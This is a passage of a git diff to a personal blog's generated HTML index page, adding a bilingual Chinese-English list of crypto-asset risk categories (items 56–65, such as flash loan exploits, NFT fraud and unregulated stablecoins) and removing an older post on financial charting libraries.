+<p><strong>56. Tax Evasion (逃税)</strong><br>使用加密资产来隐瞒收入，逃避税收，特别是在多个国家拥有资产的情况下。<br>Using cryptocurrencies to hide income and evade taxes, especially when assets are held across multiple countries.</p>
+<p><strong>57. Insider Trading (内幕交易)</strong><br>未公开的内部信息被用于个人利益相关的交易，可能违反证券法。<br>Using non-public insider information for personal gain in trading, potentially violating securities laws.</p>
+<p><strong>58. Peer-to-Peer (P2P) Market Risks (点对点市场风险)</strong><br>在P2P交易市场上，用户可以绕过银行或正规金融机构进行交易，增加欺诈或非法交易的风险。<br>On peer-to-peer markets, users can bypass banks or formal financial institutions, increasing the risk of fraud or illicit transactions.</p>
+<p><strong>59. Layer 2 Protocol Risks (Layer 2协议风险)</strong><br>涉及Layer 2扩展方案的风险，这些方案用于提高区块链交易的可扩展性，但可能缺乏充分的安全性或合规措施。<br>Risks related to Layer 2 scaling solutions, which aim to improve blockchain transaction scalability but may lack robust security or compliance measures.</p>
+<p><strong>60. Flash Loan Exploits (闪电贷攻击)</strong><br>使用无抵押的闪电贷款，在单个交易中操纵市场或智能合约，进行非法获利。<br>Using uncollateralized flash loans to manipulate the market or smart contracts within a single transaction for illicit profit.</p>
+<p><strong>61. Smart Contract Exploits (智能合约漏洞利用)</strong><br>利用智能合约中的漏洞或缺陷，执行未授权的资金转移或操纵合约行为。<br>Exploiting vulnerabilities or flaws in smart contracts to carry out unauthorized fund transfers or manipulate contract behavior.</p>
+<p><strong>62. NFT Fraud (NFT欺诈)</strong><br>与非同质化代币(NFT)相关的欺诈行为，包括伪造稀有资产、洗钱或欺骗性交易。<br>Fraud involving Non-Fungible Tokens (NFTs), including forgery of rare assets, money laundering, or deceptive transactions.</p>
+<p><strong>63. Liquidity Pool Exploitation (流动性池利用)</strong><br>通过操纵流动性池的算法或规则非法获利，导致投资者或交易者损失。<br>Illegally profiting by manipulating the algorithms or rules governing liquidity pools, causing losses to investors or traders.</p>
+<p><strong>64. DeFi Protocol Risks (去中心化金融协议风险)</strong><br>去中心化金融(DeFi)平台的风险，包括智能合约漏洞、治理攻击、流动性枯竭等。<br>Risks associated with decentralized finance (DeFi) platforms, including smart contract vulnerabilities, governance attacks, and liquidity exhaustion.</p>
+<p><strong>65. Unregulated Stablecoins (无监管稳定币)</strong><br>某些稳定币未受监管，可能在破产、赎回失败或资产透明性不足的情况下带来系统性风险。<br>Some stablecoins are unregulated, potentially posing systemic risks in the event of insolvency, redemption failures, or lack of transparency.</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="https://zhuang-weiming.github.io/2024/10/21/%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E5%92%8C%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -270,7 +427,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2024-10-21 11:57:00 / Modified: 11:57:16" itemprop="dateCreated datePublished" datetime="2024-10-21T11:57:00+08:00">2024-10-21</time>
+      <time title="Created: 2024-10-21 11:57:00 / Modified: 11:57:37" itemprop="dateCreated datePublished" datetime="2024-10-21T11:57:00+08:00">2024-10-21</time>
     </span>
 
   
@@ -659,80 +816,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zhuang-weiming.github.io/2024/08/16/%E9%87%91%E8%9E%8D%E5%BA%94%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E5%9B%BE%E8%A1%A8%E5%BA%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Weiming Zhuang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Zhuang's Diary">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/08/16/%E9%87%91%E8%9E%8D%E5%BA%94%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E5%9B%BE%E8%A1%A8%E5%BA%93/" class="post-title-link" itemprop="url">金融应用客户端的图表库</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2024-08-16 16:15:00 / Modified: 16:32:59" itemprop="dateCreated datePublished" datetime="2024-08-16T16:15:00+08:00">2024-08-16</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <ol>
-<li><p>免费开源版本，图标库 -<br><a target="_blank" rel="noopener" href="https://github.com/plotly/plotly.js">https://github.com/plotly/plotly.js</a><br><a target="_blank" rel="noopener" href="https://github.com/apache/echarts">https://github.com/apache/echarts</a><br>如下图中的 Price Performance Widget：<br><img src="/2024/08/16/%E9%87%91%E8%9E%8D%E5%BA%94%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E5%9B%BE%E8%A1%A8%E5%BA%93/1.png"></p>
-</li>
-<li><p>付费商业版本，图标库 -<br><a target="_blank" rel="noopener" href="https://devexperts.com/dxcharts/">https://devexperts.com/dxcharts/</a><br><img src="/2024/08/16/%E9%87%91%E8%9E%8D%E5%BA%94%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E5%9B%BE%E8%A1%A8%E5%BA%93/2.png"></p>
-</li>
-</ol>
-<p>看到，收费版本最大的优势 - 可以在图标中画线，做进一步的个性化的分析。</p>
-<p>另外，再推荐一下 OPENBB - <a target="_blank" rel="noopener" href="https://www.openbb.co/">https://www.openbb.co/</a> ，目前已经将ChatGPT作为投资研究的一种工具，整合进到OPENBB （ <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=Uj_wpLC-Zho">https://www.youtube.com/watch?v=Uj_wpLC-Zho</a> ）。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/51/">51</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/52/">52</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
